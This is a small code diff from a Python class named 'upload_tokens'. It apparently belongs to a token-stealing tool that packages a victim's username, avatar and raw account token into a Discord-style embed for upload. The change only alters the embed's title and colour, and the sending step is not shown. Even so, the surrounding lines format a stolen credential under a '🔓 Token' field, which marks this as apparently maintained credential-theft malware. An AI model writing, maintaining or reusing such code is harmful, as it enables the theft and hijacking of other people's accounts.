@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"Username {username}", color=0x000000)
+            embed = Embed(title=f"{username}", color=0x24262A)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
